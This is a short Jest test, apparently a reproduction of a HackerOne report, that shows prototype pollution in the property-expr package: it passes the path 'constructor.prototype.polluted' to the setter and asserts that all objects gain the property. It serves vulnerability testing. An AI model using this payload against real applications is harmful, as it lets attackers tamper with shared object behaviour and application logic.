//https://hackerone.com/reports/910206
test("prototype pollution in property-expr", () => {
    
    let expr = require('property-expr');
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    expr.setter('constructor.prototype.polluted')(obj,"yes");
    expect({}.polluted).toBe("yes");
  });
  